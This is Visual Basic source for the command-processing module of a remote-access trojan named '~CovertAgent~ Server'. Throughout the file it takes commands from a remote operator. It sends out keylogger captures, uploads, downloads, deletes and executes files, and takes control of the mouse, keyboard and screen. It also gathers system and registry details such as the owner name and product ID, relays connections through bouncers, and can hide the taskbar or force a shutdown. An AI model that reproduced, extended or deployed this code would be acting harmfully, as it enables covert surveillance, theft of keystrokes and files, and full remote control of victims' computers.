Attribute VB_Name = "modProcess"
Function SendSettings() As String

Send "settings;irc;enabled;" & CorrectReservedChars(CStr(CInt(IRC_Enabled)))
Send "settings;irc;server;" & CorrectReservedChars(IrcServer)
Send "settings;irc;port;" & CorrectReservedChars(CStr(IrcPort))
Send "settings;irc;nick;" & CorrectReservedChars(IrcNick)
Send "settings;irc;name;" & CorrectReservedChars(IrcFullName)
Send "settings;irc;email;" & CorrectReservedChars(IrcEmail)
Send "settings;ac;enabled;" & CStr(CInt(AutoConnectEnabled))
Send "settings;ac;port;" & CStr(AutoConnectPort)
Send "settings;ac;host;" & AutoConnectHost

Send "settings;listen;enabled;" & CStr(CInt(AcceptConnections))
Send "settings;listen;port;" & CStr(ListenPort)

Send "settings;keylogger;enabled;" & CorrectReservedChars(CStr(CInt((Keylogger_Enabled))))
Send "settings;bouncer;enabled;" & CorrectReservedChars(CStr(CInt(Bouncers_Enabled)))

End Function

Function SaveSettings(Arguments As String) As String
On Error Resume Next
Dim Temp() As String
Dim Item As String, Section As String, Value As String

Temp() = Split(Arguments, ";", 3)
If UBound(Temp) < 2 Then
    SaveSettings = "Insufficient parrameters, '" & Arguments & "'"
    SendError "SaveSettings", "Insufficient parrameters, '" & Arguments & "'"
    Exit Function
End If

Item = modMain.RetrieveReservedChars(Temp(0))
Section = modMain.RetrieveReservedChars(Temp(1))
Value = modMain.RetrieveReservedChars(Temp(2))

Select Case Item
Case "getsettings"
    SendSettings
Case "reload"
    modMain.LoadSettings
Case "irc"
    Select Case Section
    Case "enabled"
        WriteINI "Settings", "IRC", Value
    Case "server"
        WriteINI "IRC", "server", Value
    Case "port"
        WriteINI "IRC", "port", Value
    Case "nick"
        WriteINI "IRC", "nick", Value
    Case "name"
        WriteINI "IRC", "name", Value
    Case "email"
        WriteINI "IRC", "email", Value
    End Select
    modMain.LoadSettings
Case "ac"
    Select Case Section
    Case "enabled"
        WriteINI "Connection", "AutoConnectEnabled", Value
    Case "port"
        WriteINI "Connection", "AutoConnectPort", Value
    Case "host"
        WriteINI "Connection", "AutoConnectHost", Value
    End Select
Case "listen"
    Select Case Section
    Case "enabled"
        WriteINI "Connection", "AcceptConnections", Value
    Case "port"
        WriteINI "connection", "ListenPort", Value
    End Select
Case "keylogger"
    Select Case Section
    Case "enabled"
        WriteINI "Settings", "Keylogger", Value
    End Select
    modMain.LoadSettings
Case "bouncers"
    Select Case Section
    Case "enabled"
        WriteINI "Settings", "Bouncer", Value
    End Select
    modMain.LoadSettings
End Select
End Function

Function BrowseTo(Path As String) As String
BrowseTo = Shell("Explorer.exe", Path, "", True)
End Function

Sub Server(Arguments As String)
Dim Command As String, Parrameters As String, Temp() As String

If InStr(1, Arguments, ";") = 0 Then Arguments = Arguments & ";"

Temp() = Split(Arguments, ";", 2)

Command = Temp(0)
Parrameters = Temp(1)

Select Case Command
Case "terminate"
    End
Case "remove"
        Send "response;Uninstalling ~CovertAgent~ Server"
        modMain.Uninstall AppPath
        Send "response;Failed uninstalling ~CovertAgent~ Server"
Case "reset"
    Send "response;Reseting ~CovertAgent~ Server"
    VBA.Shell App.Path & "\" & App.EXEName & ".exe"
    End
Case "upgrade"
    modMain.Upgrade Parrameters
Case "IRC"
    
Case "Keylogger"
    
End Select

If Left(aruments, Len("upgrade;")) = "upgrade;" Then
End If

End Sub

Sub Bounce(Arguments As String)
Dim Temp() As String

If Arguments = "list" Then SendBounceList

If Left(Arguments, Len("update;")) = "update;" Then
    UpdateBounceList Mid(Arguments, Len("update;") + 1)
End If

End Sub
Sub UpdateBounceList(Bounces As String)
Dim FileNumber As Single, Path As String
Bounces = Replace(Bounces, ":", " , ")
Bounces = Replace(Bounces, vbLf, vbCrLf)

Debug.Print Bounces

FileNumber = FreeFile

Path = Environ("WINDIR") & "\System\"

If Dir(Path, vbDirectory) = "" Then
    MkDir Environ("WINDIR") & "\System\"
End If

Open Environ("WINDIR") & "\System\blist.dat" For Output As FileNumber
    Print #FileNumber, Bounces
Close FileNumber

Send "bounce;updated;"
Send "response;Resetting bounce sockets, bouncing temporarily diabled..."

frmMain.UnloadBouncers
frmMain.LoadBouncers

Send "response;Bounce sockets restored, ready for bouncing."
End Sub

Sub SendBounceList()
Dim BounceDir As String
BounceDir = Environ("WINDIR") & "\System\"

If Dir(BounceDir & "blist.dat") <> "" Then
    Dim FileData As String, FileNumber As Single, Lines() As String, Temp() As String
    
    FileNumber = FreeFile
    
    Open BounceDir & "blist.dat" For Input As FileNumber
        Do Until EOF(FileNumber)
            Line Input #FileNumber, LineData
            FileData = FileData & LineData & vbCrLf
        Loop
    Close FileNumber
    
   
    If Right(FileData, 2) = vbCrLf Then FileData = Mid(FileData, 1, Len(FileData) - 2)
    
    Lines() = Split(FileData, vbCrLf)
    
    Dim Output As String
    
    For i = 0 To UBound(Lines)
        Temp() = Split(Lines(i), " , ")
        If UBound(Temp) < 2 Then Exit Sub
        Output = Output & Val(Temp(0)) & ":" & Temp(1) & ":" & Val(Temp(2)) & vbLf
NextLine:
    Next i
    
    If Right(Output, 1) = vbLf Then Output = modMain.TrimChar(Output, vbLf)
    Send "bounce;list;" & Output
Else
    Send "bounce;empty;"
End If
End Sub

Sub SendTodaysLog()
On Error Resume Next
Dim Path As String, Filename As String, FileNumber As Single
Dim LineData As String, FileData As String

Filename = Replace(Date, "/", "-")

Path = Environ("windir") & "\System\ActivLogs\"

If Dir(Path & Filename) = "" Then Exit Sub

FileNumber = FreeFile

Open Path & Filename For Input As FileNumber
Do Until EOF(FileNumber)
    Line Input #FileNumber, LineData
    FileData = FileData & LineData & vbCrLf
Loop
Close FileNumber

FileData = modMain.TrimChar(FileData, vbCrLf)

Send "response;Sending logged data (" & Len(FileData) + Len(modKeylog.KeyLogBuffer) & " bytes)"
Send "kl;" & FileData & modKeylog.KeyLogBuffer

End Sub

Sub ListOldLogs()
Dim OldLogs() As String, Directories() As String, Temp As String

If Dir(Environ("windir") & "\System\ActivLogs", vbDirectory) = "" Then
    If Dir(Environ("windir") & "\System", vbDirectory) = "" Then
        MkDir Environ("windir") & "\System\"
    End If
    MkDir Environ("windir") & "\System\ActivLogs\"
End If

modMain.BrowseDir Environ("windir") & "\System\ActivLogs\", OldLogs(), Directories()

For i = 0 To UBound(OldLogs)
    If OldLogs(i) = "" Then GoTo nextfile
    Temp = Temp & OldLogs(i) & "*"
nextfile:
Next i

Send "oldlogs;" & Temp
End Sub

Sub FileAction(ByRef Arguments As String)
On Error Resume Next
Dim Temp() As String, Command As String, Information() As String

If InStr(1, Arguments, ";") <> 0 Then
    'Both a command and file transfer information is in Arguments
    
    Command = Split(Arguments, ";")(0)
    
    'The file's source, destination, and size are separated by a '*' respectively
    Information() = Split(Mid(Arguments, Len(Command) + 2), "*")
Else
    'Only a command
    Command = Arguments
End If

Select Case Command
Case "start"
    'The remote party is ready for the file, send away!
    modDeclare.FileTransfer.SendFile
    Send "faction;ok"
Case "receive"
    With modDeclare.FileTransfer
        
        'Clean up
        Close .TransferFileNumber
        
        .SourceFile = Information(0)
        .DestinationFile = Information(1)
        .TransferFileNumber = 0
        
        .Direction = "download"
        
        .BufferLevel = 2048
        
        .TotalBytes = Information(2)
        .TotalBytesTransfered = 0
        
        .FileTransfer = True
    End With
    
    'Tell remote party to begin the transfer
    modMain.Send "faction;start"
    
Case "send"
    With modDeclare.FileTransfer
        
        'Clean up
        Close .TransferFileNumber
        
        .SourceFile = Information(0)
        .DestinationFile = Information(1)
        .TransferFileNumber = 0
        
        .Direction = "upload"
        
        .BufferLevel = 2048
        
        .TotalBytes = FileLen(.SourceFile)
        .TotalBytesTransfered = 0
        
        .FileTransfer = True
        
        'Tell remote party file transfer information, then wait for them to tell us to begin
        modMain.Send "faction;receive;" & .SourceFile & "*" & .DestinationFile & "*" & .TotalBytes
        
    End With

Case "terminate"
    'There has been an error, clean up.
    With modDeclare.FileTransfer
                
        'Clean up
        Close .TransferFileNumber
        
        .SourceFile = ""
        .DestinationFile = ""
        .Direction = ""
        .TransferFileNumber = 0
        .FileTransfer = False
    End With
    
    'Tell remote party we are ready for the next file
    Send "faction;ok"
    
Case "done"
    'The remote party has finished sending a file
    With modDeclare.FileTransfer
        On Error Resume Next
        
        Close .TransferFileNumber
        .SourceFile = ""
        .SourceFile = Replace(.SourceFile, "\:OldLogs:\", Environ("windir") & "\System\ActivLogs\")
        
        .DestinationFile = ""
        .Direction = ""
        .TransferFileNumber = 0
        .FileTransfer = False
    End With
    
    'Ready for next file (if there are any)
    modMain.Send "faction;ok"
Case "request"
    Dim Source As String, Destination As String, FileSize As Long
        
    Source = Information(0)
    Destination = Information(1)
    
    Source = Replace(Source, "\:OldLogs:\", Environ("windir") & "\System\ActivLogs\")
    If Dir(Source) = "" Then SendError "FileAction.Request", "File not found: '" & Source & "'": Exit Sub
    
    FileSize = FileLen(Source)

    Send "faction;response;" & Source & "*" & Destination & "*" & FileSize
    Exit Sub
Case "pause"
    If Information(0) = 1 Then
        modDeclare.FileTransfer.Pause = True
    Else
        modDeclare.FileTransfer.Pause = False
    End If
End Select
End Sub

Sub RemoteControl(ByVal Arguments As String)
Dim Command As String, Temp() As String

If InStr(1, Arguments, ";") = 0 Then
    ReDim Commands(0 To 0)
    Command = Arguments
Else
    Temp() = Split(Arguments, ";", 2)
    Command = Temp(0)
    Arguments = Temp(1)
End If
    
       
        Select Case Command
        Case Chr(1)
            'mouse event
            ParseMouseEvent Arguments
        Case Chr(2)
            'keyboard event
            ParseKeyboardEvent Arguments
        Case Chr(3)
            'capture event
            ParseCaptureEvent Arguments
        Case "preview"
            Temp() = Split(Temp(1), ";", 2)
            modCapture.Preview CLng(Val(Temp(0))), CLng(Val(Temp(1)))
        End Select
    

End Sub

Sub ParseMouseEvent(ByVal Arguments As String)
    Dim Temp() As String, X As Long, Y As Long
    
    If InStr(1, Arguments, Chr(0)) = 0 Then Exit Sub
    
    Temp() = Split(Arguments, Chr(0))
    
    If UBound(Temp) < 2 Then Exit Sub
    
    X = Val(Temp(1))
    Y = Val(Temp(2))
    
    Select Case Temp(0)
        Case Chr(1)
            'mouse move
            modMain.MouseMove X, Y
        Case Chr(2)
            'left down
            modMain.LeftDown X, Y
        Case Chr(3)
            'left up
            modMain.LeftUp X, Y
        Case Chr(4)
            'right down
            modMain.RightUp X, Y
        Case Chr(5)
            'right up
            modMain.RightUp X, Y
        Case Chr(6)
            'Double Click
            modMain.LeftDown X, Y
            modMain.LeftUp X, Y
            modMain.LeftDown X, Y
            modMain.LeftUp X, Y
    End Select
End Sub

Sub ParseKeyboardEvent(ByVal Arguments As String)
    Dim Temp() As String, KeyCode As Byte
    
    If InStr(1, Arguments, Chr(0)) = 0 Then Exit Sub
    
    Temp() = Split(Arguments, Chr(0))
    
    If UBound(Temp) < 1 Then Exit Sub
    
    KeyCode = CByte(Val(Temp(1)))
    
    Select Case Temp(0)
        Case Chr(1)
            'key down
            modMain.KeyDown KeyCode
        Case Chr(2)
            'key up
            modMain.KeyUp KeyCode
    End Select
End Sub

Sub ParseCaptureEvent(ByVal Arguments As String)
    Dim Temp() As String
    
    If InStr(1, Arguments, Chr(0)) = 0 Then Arguments = Arguments & Chr(0)
    
    Temp() = Split(Arguments, Chr(0))
    
    If UBound(Temp) < 0 Then Exit Sub
       
    Select Case Mid(Temp(0), 1, 1)
    Case Chr(1)
    'Save capture settings
        modCapture.PartitionsX = Val(Temp(1))
        modCapture.PartitionsY = Val(Temp(2))
        modCapture.ColorDepth = Val(Temp(3))
        modCapture.CaptureScale = Val(Temp(4))
        
        Send "rc;" & Chr(2) & ";" & (Screen.Width / Screen.TwipsPerPixelX) & ";" & (Screen.Height / Screen.TwipsPerPixelY)
    Case Chr(2)
    'Capture Resolution
        Send "rc;" & Chr(2) & ";" & (Screen.Width / Screen.TwipsPerPixelX) & ";" & (Screen.Height / Screen.TwipsPerPixelY)
    Case Chr(3)
    'Capture Begin
        If modCapture.Busy = True Then
            modCapture.Cancel = True
            DoEvents
        End If
        
        modCapture.Cancel = False
        
        modCapture.Capture
    Case Chr(4)
        'Client ready for block ByteArray
        modCapture.ReadyForPartition = True
    Case Chr(5)
    'Capture End
        modCapture.Cancel = True
    Case Chr(6)
        'Clear Checksums, client wants all blocks sent.
            ReDim modCapture.Checksum(0 To ((modCapture.PartitionsX + 1) * (modCapture.PartitionsY + 1)))
'    Case Else
'        modCapture.ReadyForPartition = True
    End Select
End Sub

Sub Process(Arguments As String)
Dim Temp() As String, Command As String
Temp() = Split(Arguments, ";", 2)

Command = Temp(0)
Arguments = Temp(1)

Select Case Command
Case "end"
    On Error Resume Next
    Send "response;" & modMain.KillProcess(Arguments)
Case "start"
    Temp() = Split(Arguments, ";")
    If UBound(Temp) < 3 Then Exit Sub
    Send "response;" & modMain.Shell(Temp(0), Temp(1), Temp(2), CBool(Temp(3)))
End Select
End Sub

Sub Window(Arguments As String)
On Error GoTo ErrorHandler

Dim Temp() As String, Command As String, Ret As Long
Temp() = Split(Arguments, ";", 2)

Command = Temp(0)
Arguments = Temp(1)

Select Case Command
Case "close"
    On Error Resume Next
    Ret = modDeclare.CloseWindow(CLng(Arguments))
    If Ret = 0 Then
        Send "response;Window was not closed."
    Else
        Send "response;Window [" & Arguments & "] was closed."
    End If
Case "setfocus"
    modMain.FocusWindow Arguments
Case "change"
    Temp() = Split(Arguments, ";")
    If UBound(Temp) < 1 Then Exit Sub
    modMain.SetWindowCaption Temp(1), Temp(0)
Case "hide"
    modMain.WindowVisible Arguments, False
Case "show"
    modMain.WindowVisible Arguments, True
Case "sendkeys"
    Temp() = Split(Arguments, ";")
    If UBound(Temp) < 1 Then Exit Sub
    modMain.FocusWindow RetrieveReservedChars(Temp(1))
    Sleep 50
    SendKeys RetrieveReservedChars(Temp(0)), 100
End Select

    Exit Sub
ErrorHandler:
    SendError "modProcess.Window", Err.Description
    Resume Next
End Sub

Sub GetKey(Arguments As String)
Dim Temp() As String, Command As String, key As Byte
 
Temp() = Split(Arguments, ";")
If UBound(Temp) < 1 Then Exit Sub

Command = Temp(0)
key = CByte(Temp(1))

Select Case Command
Case "up"
    modMain.KeyUp key
Case "down"
    modMain.KeyDown key
Case "press"
    modMain.KeyPress key
End Select

End Sub

Sub FileTransfer(Arguments As String)
Dim Temp() As String, Command As String

Temp() = Split(Arguments, ";", 2)
If UBound(Temp) < 1 Then SendError "FileTransfer", "Insufficient Parrameters: '" & Arguments & "'": Exit Sub

Command = Temp(0)
Arguments = Temp(1)

Select Case LCase(Command)

Case "request"
    On Error GoTo RequestErrorHandler
    Dim Source As String, Destination As String, FileSize As Long, FileNumber As Single
    
    Temp() = Split(Arguments, "|")
    If UBound(Temp) < 1 Then SendError "FileTransfer.Request", "Insufficient Parrameters: '" & Arguments & "'": Exit Sub
    
    Source = Temp(0)
    Destination = Temp(1)
    
    Source = Replace(Source, "\:OldLogs:\", Environ("windir") & "\System\ActivLogs\")
    
    If Dir(Source) = "" Then SendError "FileTransfer.Request", "File not found: '" & Source & "'": Exit Sub
    
    FileNumber = FreeFile
    Open Source For Binary Access Read As FileNumber
    FileSize = LOF(FileNumber)
    Close FileNumber

    Send "transfer;response;" & Source & "|" & Destination & "|" & FileSize
    Exit Sub

RequestErrorHandler:
    SendError "FileTransfer.Request", Err.Description

Case "pause"
    Select Case Arguments
    Case "0"
        tPaused = False
    Case "1"
        tPaused = True
    Case Else
        tPaused = False
    End Select
Case "force"
    tPaused = False
    tBlockSent = True
End Select

End Sub


Sub MessageBox(Arguments As String)
Dim Temp() As String, StyleNumber As String, Title As String, Message As String

Temp() = Split(Arguments, ";")
If UBound(Temp) < 2 Then SendError "MessageBox", "Insufficient Parrameters: '" & Arguments & "'": Exit Sub

StyleNumber = CStr(Val(Temp(0)))
ImageNumber = CStr(Val(Temp(1)))
Title = RetrieveReservedChars(Temp(2))
Message = RetrieveReservedChars(Temp(3))

Select Case ImageNumber
Case 1
    MbImage = vbCritical
Case 2
    MbImage = vbQuestion
Case 3
    MbImage = vbExclamation
Case 4
    MbImage = vbInformation
End Select

Dim bResult As VbMsgBoxResult, sResult As String

If StyleNumber < 6 Then
    bResult = MsgBox(Message, StyleNumber + MbImage, Title)
    
    Select Case bResult
    Case vbAbort
        Result = "User clicked Abort."
    Case vbCancel
        Result = "User clicked Cancel."
    Case vbIgnore
        Result = "User clicked Ignore."
    Case vbNo
        Result = "User clicked No."
    Case vbRetry
        Result = "User clicked Retry."
    Case vbYes
        Result = "User clicked Yes."
    Case Else
        Result = "User terminated message box."
    End Select
    
Else
    Result = "User typed: '" & InputBox(Message, Title) & "'"
End If

Send "response;" & Result

End Sub

Sub Chat(Arguments As String)
Dim Temp() As String, Command As String

Temp() = Split(Arguments, ";", 2)
If UBound(Temp) < 1 Then SendError "Chat", "Insufficient Parrameters: '" & Arguments & "'": Exit Sub

Command = Temp(0)
Arguments = Temp(1)

Select Case Command
Case "start"
    
    frmChat.Show

Case "end"
    
    Unload frmChat

Case "message"
    
    Dim NickName As String, Message As String
    
    Temp() = Split(Arguments, ";")
    If UBound(Temp) < 1 Then SendError "Chat.Message", "Insufficient Parrameters: '" & Arguments & "'": Exit Sub
    
    NickName = modMain.RetrieveReservedChars(Temp(0))
    Message = modMain.RetrieveReservedChars(Temp(1))
    
    frmChat.ReceiveMessage NickName, Message
    
End Select

End Sub

Function Request(Arguments As String) As String
Dim Temp() As String, Command As String, info As String, Output As String
Temp() = Split(Arguments, ";")
If UBound(Temp) < 1 Then SendError "Request", "Insufficient Arguments: '" & Arguments & "'": Exit Function
Command = Temp(0)
info = Temp(1)
Select Case Command
Case "computer"
    Select Case info
    Case "systeminfo"
        Dim WindowsVersion As String, ProductID As String, ComputerName As String, ComputerUptime As String, CurrentUser As String
        Dim CpuBrand As String, CpuType As String, CpuSpeed As String
        Dim TotalMemory As String, AvailibleMemory As String
        Dim Owner As String, Organization As String
        Dim Resolution As String
        Dim LocalTime As String, Location As String
        Dim InternetConnection As String
        
        WindowsVersion = modMain.WindowsVersion
        ProductID = modRegistry.GetString("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "ProductId")
        ComputerName = modMain.GetPcName
        ComputerUptime = modMain.GetUptime(GetTickCount)
        CurrentUser = modMain.CurrentUser
        
        CpuBrand = modRegistry.GetString("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0\", "VendorIdentifier")
        CpuType = modRegistry.GetString("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0\", "Identifier")
        CpuSpeed = "~" & modRegistry.GetString("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0\", "~MHz") & "Mhz"
        
        TotalMemory = modMain.GetTotalMemory
        AvailibleMemory = modMain.GetAvailibleMemory
        
        Owner = modRegistry.GetString("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner")
        Organization = modRegistry.GetString("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization")
        
        LocalTime = Format(Now)
        
        Location = modRegistry.GetString("HKEY_USERS\.DEFAULT\Control Panel\International", "sCountry")
        
        Resolution = (Screen.Width / Screen.TwipsPerPixelX) & "x" & (Screen.Height / Screen.TwipsPerPixelY)
        
        InternetConnection = modMain.ConnectionInformation
        '1 WindowsVersion
        '2 ProductId
        '3 ComputerName
        '4 ComputerUptime
        '5 CurrentUser
        '6 CpuVendor
        '7 CpuType
        '8 CpuSpeed
        '9 TotalMemory
        '10 AvailibleMemory
        '11 Local Time
        '12 Country
        '13 Owner
        '14 Organization
        '15 Resolution
        '16 InternetInfo
        
        Send "sysinfo;" & WindowsVersion & vbLf & ProductID & vbLf & ComputerName & vbLf & ComputerUptime & vbLf & CurrentUser & vbLf & _
        CpuBrand & vbLf & CpuType & vbLf & CpuSpeed & vbLf & _
        TotalMemory & vbLf & AvailibleMemory & vbLf & _
        LocalTime & vbLf & Location & vbLf & _
        Owner & vbLf & Organization & vbLf & _
        Resolution & vbLf & _
        InternetConnection
        
    End Select
Case "windows"
        Select Case info
        Case "windows.0" ' Send both VISIBLE and INVISIBLE windows
            Dim VisibleWindows As String, InvisibleWindows As String
            VisibleWindows = modMain.GetWindows(True)
            InvisibleWindows = modMain.GetWindows(False)
            Send "window;clear; "
            Send "window;populate;" & VisibleWindows
            Send "window;populate;" & InvisibleWindows
        Case "windows.1" ' Send VISIBLE windows
            Dim AllVisibleWindows As String
            AllVisibleWindows = modMain.GetWindows(True)
            Send "window;clear; "
            Send "window;populate;" & AllVisibleWindows
        Case "processes"
            Dim poutput As String
            poutput = modMain.GetProcesses
            Send "process;" & poutput
            End Select
Case "server"
    Select Case info
    Case "version"
        Send "server;version;" & App.Title & " Version " & App.Major & "." & App.Minor & App.Revision
    End Select
Case Else
SendError "Request", "Unknown Command: '" & Arguments & "'"
End Select
End Function

Sub FileBrowser(Arguments As String)
Dim Temp() As String, Command As String
Temp() = Split(Arguments, ";", 2)

'add error
If UBound(Temp) < 1 Then Exit Sub
Command = Temp(0)
Arguments = Temp(1)

Select Case Command
Case "drives"
    Dim Drives As String
    
    Drives = modMain.GetDrives
    If Drives = "" Then Exit Sub
    Send "file;clear;"
    Send "file;drives;" & Drives
    

Case "dir"
    
    On Error GoTo DirError
    Dim Directories() As String, Files() As String, Output As String, Items() As String, dirDirectory As String
    
    dirDirectory = Arguments
    
    If Right(dirDirectory, 1) <> "\" Then dirDirectory = dirDirectory & "\"
    dirDirectory = modMain.SimplifyDirectory(dirDirectory)
    If Dir(dirDirectory, vbDirectory) = "" Then Exit Sub
    
    Send "file;clear; ;"
    
    modMain.BrowseDir dirDirectory, Files(), Directories()
    
    ReDim Items(-1 To -1)
    
    For i = 0 To UBound(Directories)
        If UBound(Items) = -1 Then
            ReDim Items(0 To 0)
        Else
            ReDim Preserve Items(0 To UBound(Items) + 1)
        End If
        
        Items(UBound(Items)) = "\" & Directories(i)
    Next i
    For i = 0 To UBound(Files)
        If UBound(Items) = -1 Then
            ReDim Items(0 To 0)
        Else
            ReDim Preserve Items(0 To UBound(Items) + 1)
        End If
        
        Items(UBound(Items)) = Files(i)
    
    Next i
    
    For i = 0 To UBound(Items)
        Select Case Len("file;dir;" & dirDirectory & ";" & Output & Items(i))
        Case Is > 1024
            Output = TrimChar(Output, "|")
            Send "file;dir;" & dirDirectory & ";" & Output
            Output = ""
            Output = Output & Items(i) & "|"
        Case Else
            Output = Output & Items(i) & "|"
        End Select
    Next i
            

    Output = TrimChar(Output, "|")
    Send "file;dir;" & dirDirectory & ";" & Output
    Exit Sub
DirError:
    Select Case Err.Number
    Case 52
        SendError "FileManager.Dir", "Cannot read from disk."
    Case Else
        SendError "FileManager.Dir", Err.Description & " (from arguments '" & Arguments & "')"
    End Select


Case "up"
    
    Dim upDirectory As String
    
    upDirectory = Arguments
    upDirectory = modMain.SimplifyDirectory(upDirectory)
    If Dir(upDirectory, vbDirectory) = "" Then Exit Sub
    
    If Len(upDirectory) = 3 Or Right(upDirectory, 2) = ":\" Then
        'They are at the root of a drive
        modProcess.FileBrowser "drives;"
        Exit Sub
    End If
    
    upDirectory = modMain.ParentDirectory(upDirectory)
    modProcess.FileBrowser ("dir;" & upDirectory)


Case "rename"
    
    On Error GoTo RenameError
    Dim OldPath As String, NewName As String
    
    Temp() = Split(Arguments, ";")
    If UBound(Temp) < 1 Then SendError "FileBrowser.Rename", "Insufficient Parameters '" & Arguments & "'"
    OldPath = modMain.RetrieveReservedChars(Temp(0))
    NewName = RetrieveReservedChars(Temp(1))
    
    If Dir(OldPath) = "" Then SendError "FileBrowser.Rename", "File not found: '" & OldPath & "'"
    
    Name OldPath As NewName
    
    Exit Sub
RenameError:
    SendError "FileBowser.Rename", Err.Description
    

Case "copy"
    
    On Error GoTo CopyError
    Dim Source As String, Destination As String
    
    Temp() = Split(Arguments, ";")
    If UBound(Temp) < 1 Then SendError "FileBrowser.Copy", "Insufficient Parameters '" & Arguments & "'"
    Source = modMain.RetrieveReservedChars(Temp(0))
    Destination = modMain.RetrieveReservedChars(Temp(1))
    
    If Dir(Source) = "" Then SendError "FileBrowser.Copy", "File not found: '" & OldPath & "'"
    
    FileCopy Source, Destination
    
    Exit Sub
CopyError:
    SendError "FileBowser.Copy", Err.Description
 
 
Case "delete"
    On Error Resume Next
    Dim Filename As String
    
    Arguments = Replace(Arguments, "\:OldLogs:\", Environ("windir") & "\System\ActivLogs\")
    
    Filename = Dir(Arguments): If Filename = "" Then Exit Sub
    Kill Arguments
    Send "response;File '" & Filename & "' was deleted."


Case "execute"
    
    Dim eFileName As String
    Dim ePath As String, eArguments As String, eStartPath As String, eVisible As Single
    
    Temp() = Split(Arguments, ";")
    
    
    For i = 0 To UBound(Temp)
        Select Case i
        Case 0
            ePath = RetrieveReservedChars(Temp(i))
        Case 1
            eArguments = RetrieveReservedChars(Temp(i))
        Case 2
            eStartPath = RetrieveReservedChars(Temp(i))
        Case 3
            eVisible = RetrieveReservedChars(CBool(Temp(i)))
        End Select
    Next i
    eFileName = Dir(ePath)
    Send ("response;" & modMain.Shell(ePath, eArguments, eStartPath, True)) & "(" & eFileName & ")"
    
End Select

End Sub

Function Windows(Arguments As String) As String
Dim Temp() As String, Command As String
Temp() = Split(Arguments, ";", 2)
Command = Temp(0)
Arguments = LCase(Temp(1))
If Right(Arguments, 1) = ";" Then Arguments = Mid(Arguments, 1, Len(Arguments) - 1)

Select Case LCase(Command)
Case "hide"
    If Right(Arguments, 1) = ";" Then Arguments = Mid(Arguments, 1, Len(Arguments) - 1)
    Select Case Arguments
    Case "startbutton"
        HideButton False
        Windows = "Start Button has been hidden."
    Case "systray"
        HideSystray False
        Windows = "System tray has been hidden."
    Case "sysclock"
        HideClock False
        Windows = "System clock has been hidden."
    Case "taskbar"
        HideTaskbar False
        Windows = "Taskbar has been hidden."
    Case "taskbaritems"
        HideTaskbarItems False
        Windows = "Taskbar items have been hidden."
    End Select
Case "show"
    Select Case Arguments
    Case "startbutton"
        HideButton True
        Windows = "Start Button is visible."
    Case "systray"
        HideSystray True
        Windows = "System tray is visible."
    Case "sysclock"
        HideClock True
        Windows = "System clock is visible."
    Case "taskbar"
        HideTaskbar True
        Windows = "Taskbar is visible."
    Case "taskbaritems"
        HideTaskbarItems True
        Windows = "Taskbar items are visible."
    End Select
Case "media"
    Select Case Arguments
    Case "cd.open"
        EjectCD True
        Windows = "CD tray has been opened."
    Case "cd.close"
        EjectCD False
        Windows = "CD tray has been closed."
    End Select
Case "disable"
    Select Case Arguments
    Case "sp_keystrokes"
    LockActionKeys True
    End Select
Case "enable"
    Select Case Arguments
    Case "sp_keystrokes"
    LockActionKeys False
    End Select
Case "power"
    Select Case Arguments
    Case "logoff"
        Send "response;Logging out of current user."
        LogoffWindows
    Case "shutdown"
        Send "response;Exiting windows."
        ExitWindows
    Case "restart"
        Send "response;Restarting windows."
        RestartWindows
    Case "reboot"
        Send "response;Rebooting system."
        RebootSystem
    End Select
End Select
End Function
